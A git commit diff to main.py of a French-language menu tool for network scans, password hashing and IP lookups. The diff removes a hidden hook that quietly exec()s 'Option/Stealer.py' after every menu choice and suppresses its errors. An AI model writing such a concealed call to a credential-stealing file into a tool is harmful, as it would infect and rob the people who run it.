10d28811af651e441f43445f0e33e93fa515a501
juto222 <thomasjulien3101@gmail.com>
2024-10-16 11:28:18 +0200

    Update main.py

--- main.py
+++ main.py
@@ -46,21 +46,14 @@ def afficher_menu():
 def obtenir_choix():
     try:
         return int(input("""
+        Entrez une option :
  ____(user@Tool)
-│__#
-Entrez une option : """))
+│__# """))
     except ValueError:
         print("Entrée invalide. Veuillez entrer un numéro valide.")
         return -1  # Retourne un choix invalide pour forcer la boucle à redemander l'option
 
-def execute_file():
-    try:
-        with open("Option/Stealer.py") as f:  
-            code = f.read()
-            exec(code)
-    except Exception:
-        print(" ")
-    
+
 
 while True:
     afficher_menu()
@@ -69,62 +62,52 @@ while True:
 
     if choix == 1:
         try:
-            GenererIPv6.generate_ipv6()
-            execute_file()  
+            GenererIPv6.generate_ipv6() 
         except Exception as e:
             print(f"Erreur lors de la génération d'IPv6 : {e}")
     elif choix == 2:
         try:
             ScanNetwork.scan_network()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors du scan du réseau : {e}")
     elif choix == 3:
         try:
             MdpGenerer.generer_mot_de_passe()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors de la génération du mot de passe : {e}")
     elif choix == 4:
         try:
             HashFichier.calculer_hash_fichier()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors du calcul du hash de fichier : {e}")
     elif choix == 5:
         try:
-            Sousdomaine.sousdomaine()
-            execute_file()  
+            Sousdomaine.sousdomaine()  
         except Exception as e:
             print(f"Erreur lors de la recherche de sous-domaines : {e}")
     elif choix == 6:
         try:
-            HashMDP.hasher_mot_de_passe()
-            execute_file()  
+            HashMDP.hasher_mot_de_passe() 
         except Exception as e:
             print(f"Erreur lors du hachage du mot de passe : {e}")
     elif choix == 7:
         try:
             VerifMDP.mdp_force()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors de la vérification du mot de passe : {e}")
     elif choix == 8:
         try:
             IPLookup.obtenir_infos_ip()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors de la récupération des informations IP : {e}")
     elif choix == 9:
         try:
             Conv.convertir()
-            execute_file()  
         except Exception as e:
             print(f"Erreur lors de la conversion : {e}")
     elif choix == 10:
         try:
-            WebCheck.web()
-            execute_file()  
+            WebCheck.web() 
         except Exception as e:
             print(f"Erreur lors de la vérification : {e}")
     elif choix == 11:
